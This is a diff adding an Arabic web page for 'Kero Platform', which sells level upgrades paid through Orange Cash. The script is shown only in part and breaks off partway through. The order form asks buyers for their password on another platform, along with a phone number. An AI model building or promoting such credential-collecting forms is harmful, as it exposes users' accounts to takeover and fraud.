@@ -1,0 +1,1563 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kero Platform | خدمات منصة كيرو</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary: #4361ee; /* أزرق أكثر إشراقاً وإثارة */
+            --primary-light: #6a8cff;
+            --secondary: #9d4edd; /* بنفسجي أكثر حيوية */
+            --accent: #ff6b6b; /* أحمر مرجاني جذاب */
+            --success: #4cd964; /* أخضر أكثر نضارة */
+            --warning: #ffcc00; /* أصفر ذهبي مشرق */
+            --danger: #ff3b30; /* أحمر طاقة */
+            --gradient-primary: linear-gradient(135deg, #4361ee 0%, #9d4edd 100%);
+            --gradient-secondary: linear-gradient(135deg, #ff6b6b 0%, #ffcc00 100%);
+            --gradient-success: linear-gradient(135deg, #4cd964 0%, #2ecc71 100%);
+            --dark-bg: #1a1f2e;
+            --dark-card: #252b3f;
+            --dark-text: #e6e9f0;
+            --dark-border: #3a4157;
+            --light-bg: #f8f9fa;
+            --light-card: #ffffff;
+            --light-text: #2d3748;
+            --light-border: #e2e8f0;
+            --glow-soft: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --shadow-soft: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1f2e 0%, #252b3f 100%);
+            min-height: 100vh;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow-x: hidden;
+            color: var(--dark-text);
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(67, 97, 238, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(157, 78, 221, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(255, 107, 107, 0.1) 0%, transparent 50%);
+            z-index: -1;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: var(--dark-card);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            border: 1px solid var(--dark-border);
+            position: relative;
+            z-index: 1;
+            animation: containerEntrance 0.8s ease-out;
+        }
+
+        @keyframes containerEntrance {
+            0% { transform: translateY(30px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+
+        .header {
+            background: linear-gradient(135deg, rgba(37, 43, 63, 0.95) 0%, rgba(42, 49, 72, 0.95) 100%);
+            color: var(--dark-text);
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 1px solid var(--dark-border);
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+
+        .logo {
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+            color: var(--primary);
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            animation: logoFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .header h1 {
+            font-size: 2rem;
+            margin-bottom: 8px;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.8;
+        }
+
+        /* التنقل السريع */
+        .quick-nav {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .nav-btn {
+            padding: 10px 20px;
+            background: rgba(58, 65, 87, 0.5);
+            border: 1px solid var(--dark-border);
+            border-radius: 25px;
+            color: var(--dark-text);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .nav-btn:hover {
+            background: rgba(67, 97, 238, 0.1);
+            border-color: var(--primary);
+            transform: translateY(-2px);
+            box-shadow: var(--glow-soft);
+        }
+
+        .content {
+            padding: 30px 20px 20px;
+        }
+
+        /* Steps Indicator */
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 20px;
+            right: 20px;
+            height: 3px;
+            background: var(--dark-border);
+            border-radius: 2px;
+            z-index: 0;
+        }
+
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--dark-card);
+            border: 2px solid var(--dark-border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: var(--dark-text);
+            position: relative;
+            z-index: 1;
+            transition: all 0.3s ease;
+        }
+
+        .step.active {
+            background: var(--primary);
+            border-color: var(--primary);
+            color: white;
+            box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.2);
+        }
+
+        .step.completed {
+            background: var(--success);
+            border-color: var(--success);
+            color: white;
+            box-shadow: 0 0 0 4px rgba(76, 217, 100, 0.2);
+        }
+
+        /* Packages */
+        .packages-container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .package {
+            background: var(--dark-card);
+            border: 1px solid var(--dark-border);
+            border-radius: 16px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .package::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: transparent;
+            transition: all 0.3s ease;
+        }
+
+        .package:hover::before {
+            background: var(--primary);
+        }
+
+        .package:hover {
+            border-color: var(--primary);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .package.selected {
+            border-color: var(--primary);
+            background: rgba(67, 97, 238, 0.05);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .package.selected::before {
+            background: var(--primary);
+        }
+
+        .package-badge {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: var(--gradient-secondary);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        .package-badge.warning {
+            background: var(--warning);
+        }
+
+        .package-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .package-details {
+            color: var(--dark-text);
+            margin-bottom: 15px;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            opacity: 0.8;
+        }
+
+        .package-price {
+            font-size: 1.7rem;
+            font-weight: 800;
+            color: var(--secondary);
+            text-align: left;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .package-price::before {
+            content: 'جنيه';
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--dark-text);
+            opacity: 0.7;
+        }
+
+        /* Custom Range */
+        .custom-range {
+            margin-top: 25px;
+            padding: 25px;
+            background: rgba(37, 43, 63, 0.7);
+            border-radius: 16px;
+            border: 1px solid var(--dark-border);
+            box-shadow: var(--shadow-soft);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .custom-range:hover {
+            border-color: var(--secondary);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .custom-range::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--secondary);
+        }
+
+        .range-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--secondary);
+            margin-bottom: 20px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .range-inputs-container {
+            background: rgba(26, 31, 46, 0.5);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid var(--dark-border);
+        }
+
+        .range-inputs {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .range-input {
+            width: 100px;
+            padding: 15px;
+            border: 1px solid var(--dark-border);
+            border-radius: 12px;
+            font-size: 1.1rem;
+            text-align: center;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            background: rgba(26, 31, 46, 0.7);
+            color: var(--primary);
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .range-input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1), 0 0 0 3px rgba(67, 97, 238, 0.1);
+            transform: scale(1.05);
+        }
+
+        .range-separator {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .range-info {
+            text-align: center;
+            font-size: 0.9rem;
+            color: var(--dark-text);
+            margin-top: 10px;
+            opacity: 0.7;
+        }
+
+        .calculated-price {
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--success);
+            margin-top: 15px;
+            padding: 20px;
+            background: rgba(26, 31, 46, 0.5);
+            border-radius: 12px;
+            border: 1px solid var(--dark-border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .calculated-price.active {
+            background: rgba(76, 217, 100, 0.1);
+            border-color: var(--success);
+            transform: scale(1.02);
+        }
+
+        .price-breakdown {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: var(--dark-text);
+            text-align: center;
+            background: rgba(26, 31, 46, 0.5);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid var(--dark-border);
+            max-height: 150px;
+            overflow-y: auto;
+            opacity: 0.8;
+        }
+
+        .pricing-info {
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(37, 43, 63, 0.7);
+            border-radius: 12px;
+            border-left: 3px solid var(--primary);
+        }
+
+        .pricing-title {
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 1.1rem;
+        }
+
+        .pricing-list {
+            list-style-type: none;
+            padding-right: 5px;
+        }
+
+        .pricing-list li {
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            opacity: 0.9;
+        }
+
+        .pricing-list li::before {
+            content: "•";
+            color: var(--primary);
+            font-weight: bold;
+            margin-left: 5px;
+        }
+
+        /* Forms */
+        .form-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            color: var(--primary);
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+        }
+
+        .form-title::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 25%;
+            right: 25%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            border-radius: 3px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            color: var(--primary);
+            font-weight: 600;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid var(--dark-border);
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: rgba(26, 31, 46, 0.7);
+            color: var(--dark-text);
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1), 0 0 0 3px rgba(67, 97, 238, 0.1);
+            background: rgba(26, 31, 46, 0.9);
+        }
+
+        .form-input.small {
+            max-width: 100px;
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: var(--primary);
+        }
+
+        .form-hint {
+            font-size: 0.85rem;
+            color: var(--dark-text);
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            opacity: 0.7;
+        }
+
+        /* Payment Info */
+        .payment-info {
+            background: rgba(76, 217, 100, 0.1);
+            border: 1px solid var(--success);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: var(--shadow-soft);
+        }
+
+        .payment-info::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--success);
+        }
+
+        .payment-title {
+            font-size: 1.1rem;
+            color: var(--success);
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .payment-number {
+            font-size: 1.5rem;
+            color: var(--primary);
+            font-weight: 700;
+            margin: 10px 0;
+            direction: ltr;
+            display: inline-block;
+            background: rgba(26, 31, 46, 0.7);
+            padding: 10px 20px;
+            border-radius: 10px;
+            border: 1px solid var(--dark-border);
+            box-shadow: var(--shadow-soft);
+        }
+
+        .payment-note {
+            color: var(--dark-text);
+            font-size: 0.9rem;
+            margin-top: 10px;
+            opacity: 0.8;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: white;
+            font-weight: 700;
+            box-shadow: var(--glow-soft);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-warning {
+            background: var(--gradient-secondary);
+            color: white;
+            font-weight: 700;
+            box-shadow: var(--glow-soft);
+        }
+
+        .btn-warning:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-secondary {
+            background: rgba(58, 65, 87, 0.7);
+            color: var(--dark-text);
+            border: 1px solid var(--dark-border);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(58, 65, 87, 0.9);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-soft);
+        }
+
+        .btn-whatsapp {
+            background: #25d366;
+            color: white;
+            text-decoration: none;
+            margin-top: 15px;
+            box-shadow: var(--glow-soft);
+        }
+
+        .btn-whatsapp:hover {
+            background: #128c7e;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        /* Success Section */
+        .success-section {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .success-icon {
+            font-size: 5rem;
+            color: var(--success);
+            margin-bottom: 25px;
+            animation: bounce 1s ease;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-15px); }
+            60% { transform: translateY(-7px); }
+        }
+
+        .success-title {
+            font-size: 2rem;
+            color: var(--success);
+            margin-bottom: 15px;
+            font-weight: 800;
+        }
+
+        .success-message {
+            color: var(--dark-text);
+            margin-bottom: 25px;
+            line-height: 1.6;
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        /* التنبيهات والإشعارات */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background: var(--dark-card);
+            border: 1px solid var(--primary);
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            color: var(--dark-text);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.success {
+            border-color: var(--success);
+        }
+
+        .notification.warning {
+            border-color: var(--warning);
+        }
+
+        .notification.error {
+            border-color: var(--danger);
+        }
+
+        /* قسم الإحصائيات */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .stat-card {
+            background: rgba(37, 43, 63, 0.7);
+            border: 1px solid var(--dark-border);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-3px);
+            box-shadow: var(--glow-soft);
+        }
+
+        .stat-number {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            color: var(--dark-text);
+            opacity: 0.8;
+        }
+
+        /* قسم الأسئلة الشائعة */
+        .faq-section {
+            margin-top: 30px;
+        }
+
+        .faq-item {
+            background: rgba(37, 43, 63, 0.7);
+            border: 1px solid var(--dark-border);
+            border-radius: 10px;
+            margin-bottom: 10px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .faq-item:hover {
+            border-color: var(--primary);
+        }
+
+        .faq-question {
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .faq-question:hover {
+            background: rgba(67, 97, 238, 0.05);
+        }
+
+        .faq-answer {
+            padding: 0 15px;
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .faq-item.active .faq-answer {
+            padding: 0 15px 15px;
+            max-height: 500px;
+        }
+
+        /* شريط التقدم */
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: var(--dark-border);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--gradient-primary);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        /* العداد */
+        .counter {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .counter-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--accent);
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .counter-btn:hover {
+            transform: scale(1.1);
+            background: var(--danger);
+        }
+
+        .counter-value {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--warning);
+            min-width: 50px;
+            text-align: center;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .content {
+                padding: 20px 15px 15px;
+            }
+            
+            .range-inputs {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .range-separator {
+                transform: rotate(90deg);
+            }
+            
+            .package-price {
+                font-size: 1.5rem;
+            }
+            
+            .header {
+                padding: 25px 15px;
+            }
+            
+            .logo {
+                font-size: 3rem;
+            }
+            
+            .header h1 {
+                font-size: 1.7rem;
+            }
+            
+            .quick-nav {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .stats {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- إشعار -->
+    <div class="notification" id="notification">
+        <i class="fas fa-info-circle"></i>
+        <span id="notification-text">رسالة الإشعار</span>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-laptop-code"></i>
+            </div>
+            <h1>منصة كيرو</h1>
+            <p>Kero Platform Services</p>
+            
+            <!-- التنقل السريع -->
+            <div class="quick-nav">
+                <button class="nav-btn" onclick="showFaq()">
+                    <i class="fas fa-question-circle"></i> الأسئلة الشائعة
+                </button>
+                <button class="nav-btn" onclick="showStats()">
+                    <i class="fas fa-chart-bar"></i> الإحصائيات
+                </button>
+                <button class="nav-btn" onclick="contactSupport()">
+                    <i class="fas fa-headset"></i> الدعم الفني
+                </button>
+            </div>
+
+            <!-- شريط التقدم -->
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+
+        <!-- Content -->
+        <div class="content">
+            <!-- Steps Indicator -->
+            <div class="steps">
+                <div class="step active" id="step1">1</div>
+                <div class="step" id="step2">2</div>
+                <div class="step" id="step3">3</div>
+            </div>
+
+            <!-- Package Selection -->
+            <div class="form-section active" id="packageSection">
+                <h2 class="form-title">
+                    <i class="fas fa-box-open"></i> اختر الباقة المناسبة
+                </h2>
+                
+                <!-- إحصائيات سريعة -->
+                <div class="stats" id="statsSection" style="display: none;">
+                    <div class="stat-card">
+                        <div class="stat-number">+500</div>
+                        <div class="stat-label">عميل راضي</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">24/7</div>
+                        <div class="stat-label">دعم فني</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">99%</div>
+                        <div class="stat-label">نجاح التنفيذ</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">+1000</div>
+                        <div class="stat-label">طلب مكتمل</div>
+                    </div>
+                </div>
+                
+                <div class="packages-container">
+                    <div class="package" onclick="selectPackage('economy')">
+                        <div class="package-badge">الأكثر طلباً</div>
+                        <div class="package-title">
+                            <i class="fas fa-leaf"></i> الباقة الاقتصادية
+                        </div>
+                        <div class="package-details">١-٢ كيرو | حلول أساسية وسريعة</div>
+                        <div class="package-price">١٠</div>
+                    </div>
+                    
+                    <div class="package" onclick="selectPackage('medium')">
+                        <div class="package-badge warning">مميز</div>
+                        <div class="package-title">
+                            <i class="fas fa-star"></i> الباقة المتوسطة
+                        </div>
+                        <div class="package-details">٣-١٠ كيرو | حلول متقدمة وشاملة</div>
+                        <div class="package-price">٥٠</div>
+                    </div>
+                </div>
+                
+                <!-- Custom Range Section -->
+                <div class="custom-range">
+                    <div class="range-title">
+                        <i class="fas fa-sliders-h"></i> تحديد نطاق مخصص
+                    </div>
+                    
+                    <div class="range-inputs-container">
+                        <div class="range-inputs">
+                            <input type="number" id="fromKero" class="range-input" min="1" max="20" placeholder="من" onchange="calculatePrice()">
+                            <div class="range-separator">إلى</div>
+                            <input type="number" id="toKero" class="range-input" min="1" max="20" placeholder="إلى" onchange="calculatePrice()">
+                        </div>
+                        <div class="range-info">
+                            أدخل النطاق المطلوب من 1 إلى 20 كيرو
+                        </div>
+                    </div>
+
+                    <!-- عداد الكيرو -->
+                    <div class="counter">
+                        <button class="counter-btn" onclick="changeKeroValue(-1)">-</button>
+                        <div class="counter-value" id="keroValue">1</div>
+                        <button class="counter-btn" onclick="changeKeroValue(1)">+</button>
+                    </div>
+                    
+                    <div class="calculated-price" id="calculatedPrice">
+                        <i class="fas fa-calculator"></i> السعر: -- جنيه
+                    </div>
+                    
+                    <div class="price-breakdown" id="priceBreakdown">
+                        <!-- سيتم ملء تفاصيل التسعير هنا -->
+                    </div>
+                    
+                    <div class="pricing-info">
+                        <div class="pricing-title">
+                            <i class="fas fa-info-circle"></i> معلومات التسعير
+                        </div>
+                        <ul class="pricing-list">
+                            <li><i class="fas fa-check-circle" style="color: var(--success);"></i> المستويات من 1 إلى 17: 10 جنيه لكل مستوى</li>
+                            <li><i class="fas fa-check-circle" style="color: var(--warning);"></i> المستوى 18: 20 جنيه</li>
+                            <li><i class="fas fa-check-circle" style="color: var(--accent);"></i> المستوى 19: 20 جنيه</li>
+                            <li><i class="fas fa-check-circle" style="color: var(--secondary);"></i> المستوى 20: 20 جنيه</li>
+                        </ul>
+                    </div>
+                    
+                    <button class="btn btn-primary" onclick="selectCustomRange()" style="margin-top: 15px;">
+                        <i class="fas fa-check"></i> تأكيد النطاق المخصص
+                    </button>
+
+                    <button class="btn btn-warning" onclick="showEmergencySupport()" style="margin-top: 10px;">
+                        <i class="fas fa-life-ring"></i> دعم طارئ
+                    </button>
+                </div>
+
+                <!-- الأسئلة الشائعة -->
+                <div class="faq-section" id="faqSection" style="display: none;">
+                    <h3 class="form-title" style="font-size: 1.3rem; margin-bottom: 15px;">
+                        <i class="fas fa-question-circle"></i> الأسئلة الشائعة
+                    </h3>
+                    
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <span>كم تستغرق مدة التنفيذ؟</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>مدة التنفيذ تتراوح بين 24-48 ساعة بعد تأكيد التحويل.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <span>هل يمكنني طلب مستويات أكثر من 20؟</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>نعم، يمكنك التواصل مع الدعم الفني لترتيب باقة خاصة.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">
+                            <span>ماذا لو لم يعمل الكيرو بعد الطلب؟</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="faq-answer">
+                            <p>يمكنك التواصل مع الدعم الفني وسنقوم بحل المشكلة فوراً.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Data Form -->
+            <div class="form-section" id="dataForm">
+                <h2 class="form-title">
+                    <i class="fas fa-clipboard-list"></i> معلومات الطلب
+                </h2>
+                
+                <div class="payment-info">
+                    <div class="payment-title">
+                        <i class="fas fa-mobile-alt"></i> رقم أورانج كاش
+                    </div>
+                    <div class="payment-number">01121018575</div>
+                    <div class="payment-note">سيتم تأكيد الطلب فور التحويل</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="userName">
+                        <i class="fas fa-user-circle"></i> اسم المستخدم الخاص بالمنصة
+                    </label>
+                    <input type="text" id="userName" class="form-input" placeholder="أدخل اسم المستخدم الخاص بك في المنصة" required>
+                    <div class="form-hint">
+                        <i class="fas fa-info-circle"></i> اسم المستخدم الذي تستخدمه لتسجيل الدخول لمنصة كيرو
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="platformPassword">
+                        <i class="fas fa-lock"></i> كلمة سر منصة كيرو
+                    </label>
+                    <input type="password" id="platformPassword" class="form-input" placeholder="أدخل كلمة السر" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="phoneNumber">
+                        <i class="fas fa-phone"></i> رقم الهاتف
+                    </label>
+                    <input type="tel" id="phoneNumber" class="form-input" placeholder="أدخل رقم الهاتف" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="lastTwoDigits">
+                        <i class="fas fa-hashtag"></i> آخر رقمين من الرقم المحول منه
+                    </label>
+                    <input type="text" id="lastTwoDigits" class="form-input small" placeholder="75" maxlength="2" 
+                           pattern="[0-9]{2}" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    <div class="form-hint">
+                        <i class="fas fa-info-circle"></i> أدخل آخر رقمين فقط من الرقم الذي حولت منه
+                    </div>
+                </div>
+                
+                <button class="btn btn-primary" onclick="submitOrder()">
+                    <i class="fas fa-paper-plane"></i> تأكيد الطلب وإرسال البيانات
+                </button>
+                <button class="btn btn-secondary" onclick="backToPackages()" style="margin-top: 10px;">
+                    <i class="fas fa-arrow-right"></i> الرجوع لاختيار الباقة
+                </button>
+            </div>
+
+            <!-- Confirmation -->
+            <div class="form-section" id="confirmation">
+                <div class="success-section">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h2 class="success-title">تم استلام طلبك بنجاح!</h2>
+                    <p class="success-message">
+                        تم إرسال بيانات طلبك بنجاح وسيتم التواصل معك خلال ٢٤ ساعة لتأكيد الطلب وتنفيذه
+                    </p>
+                    
+                    <div class="payment-info">
+                        <div class="payment-title">
+                            <i class="fas fa-mobile-alt"></i> رقم أورانج كاش
+                        </div>
+                        <div class="payment-number">01121018575</div>
+                        <div class="payment-note">يرجى إتمام التحويل ثم إرسال صورة الإيصال</div>
+                    </div>
+                    
+                    <a href="https://wa.me/201121018575" 
+                       class="btn btn-whatsapp" target="_blank">
+                       <i class="fab fa-whatsapp"></i> إرسال الإيصال على الواتساب
+                    </a>
+                    
+                    <button class="btn btn-primary" onclick="newOrder()" style="margin-top: 15px;">
+                        <i class="fas fa-plus"></i> طلب جديد
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // دالة لعرض الإشعارات
+        function showNotification(message, type = 'info') {
+            const notification = document.getElementById('notification');
+            const notificationText = document.getElementById('notification-text');
+            
+            notificationText.textContent = message;
+            notification.className = 'notification ' + type + ' show';
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        // دالة للأسئلة الشائعة
+        function toggleFaq(element) {
+            const faqItem = element.parentElement;
+            faqItem.classList.toggle('active');
+            
+            const icon = element.querySelector('i');
+            if (faqItem.classList.contains('active')) {
